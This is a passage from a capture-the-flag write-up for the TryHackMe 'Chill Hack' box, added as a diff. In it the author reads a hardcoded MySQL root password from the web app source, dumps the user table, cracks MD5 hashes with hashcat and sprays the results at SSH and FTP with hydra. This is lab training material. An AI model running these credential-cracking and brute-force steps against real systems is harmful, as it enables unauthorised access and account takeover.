@@ -566,3 +566,272 @@ Now we can explore webserver on our box:
 
 
 
+
+![chillhack6](https://user-images.githubusercontent.com/42389836/147882495-770dd90b-1130-44de-8ab7-25519a5b4795.png)
+
+
+
+![chillhack7](https://user-images.githubusercontent.com/42389836/147882539-e0692ea0-90ba-46a4-96b5-d09ea660cd3e.png)
+
+
+
+We got a simple login form.
+
+
+By looking in default Apache folder, we found a "files" directory:
+
+
+```
+apaar@ubuntu:~$ cd /var/www/
+apaar@ubuntu:/var/www$ ls
+files  html
+apaar@ubuntu:/var/www$ cd files/
+apaar@ubuntu:/var/www/files$ ls
+account.php  hacker.php  images  index.php  style.css
+```
+
+
+This is document root of our login form:
+
+
+```
+apaar@ubuntu:/var/www/files$ cat index.php
+<html>
+<body>
+<?php
+        if(isset($_POST['submit']))
+        {
+                $username = $_POST['username'];
+                $password = $_POST['password'];
+                ob_start();
+                session_start();
+                try
+                {
+                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","XX[REDACTED]");
+                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
+                }
+                catch(PDOException $e)
+                {
+                        exit("Connection failed ". $e->getMessage());
+                }
+                require_once("account.php");
+                $account = new Account($con);
+                $success = $account->login($username,$password);
+                if($success)
+                {
+                        header("Location: hacker.php");
+                }
+        }
+?>
+<link rel="stylesheet" type="text/css" href="style.css">
+        <div class="signInContainer">
+                <div class="column">
+                        <div class="header">
+                                <h2 style="color:blue;">Customer Portal</h2>
+                                <h3 style="color:green;">Log In<h3>
+                        </div>
+                        <form method="POST">
+                                <?php echo $success?>
+                                <input type="text" name="username" id="username" placeholder="Username" required>
+                                <input type="password" name="password" id="password" placeholder="Password" required>
+                                <input type="submit" name="submit" value="Submit">
+                        </form>
+                </div>
+        </div>
+</body>
+</html>
+```
+
+
+Since we got MySQL root password, let's explore database:
+
+
+```
+apaar@ubuntu:/var/www/files$ mysql -uroot -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2
+Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql>
+```
+
+Let's move to webporal database:
+
+
+```
+mysql> use webportal
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql>
+```
+
+
+We just got one table; let's explore his content:
+
+
+```
+mysql> select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f11[.......] |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e5[.......] |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql>
+```
+
+"password" field looks definitely MD5, so let's try to crack them with hashcat:
+
+
+```
+# cat > 19_hashes
+7e53614ced3640d5de23f11[.......]
+686216240e5af30df0501e5[.......]
+```
+
+
+```
+# hashcat -m 0 -a 0 -o cracked_hashes.txt 19_hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2884/2948 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: 19_hashes
+Time.Started.....: Sun Jan  2 00:40:35 2022 (5 secs)
+Time.Estimated...: Sun Jan  2 00:40:40 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1243.1 kH/s (0.45ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 2/2 (100.00%) Digests
+Progress.........: 5736448/14344385 (39.99%)
+Rejected.........: 0/5736448 (0.00%)
+Restore.Point....: 5734400/14344385 (39.98%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: maston420 -> masta619
+
+Started: Sun Jan  2 00:39:10 2022
+Stopped: Sun Jan  2 00:40:41 2022
+root@kali:/opt/TryHackMe/chillhack# cat cracked_hashes.txt
+7e53614ced3640d5de23f11[.......]:dontask[......]
+686216240e5af30df0501e5[.......]:master[......]
+```
+
+
+We then try if these new credentials are valid for SSH/FTP access:
+
+
+```
+root@kali:/opt/TryHackMe/chillhack# cat userlist
+anurodh
+apaar
+aurick
+```
+
+
+```
+# hydra -L userlist -P passlist ssh://10.10.110.120
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 00:44:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:3/p:2), ~1 try per task
+[DATA] attacking ssh://10.10.110.120:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 00:44:46
+```
+
+```
+root@kali:/opt/TryHackMe/chillhack# hydra -L userlist -P passlist ftp://10.10.110.120
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 00:44:52
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:3/p:2), ~1 try per task
+[DATA] attacking ftp://10.10.110.120:21/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 00:44:56
+```
+
+
+No luck.
+
+
+By the way, we are now able to authtenticate to login form:
+
+
+
+![chillhack8](https://user-images.githubusercontent.com/42389836/147883276-b822ae93-69d9-4128-8cc8-db190f744b0b.png)
+
+
+![chillhack9](https://user-images.githubusercontent.com/42389836/147883292-3ea54f38-5c50-4ac8-8c75-6483f01f8045.png)
+
+
+
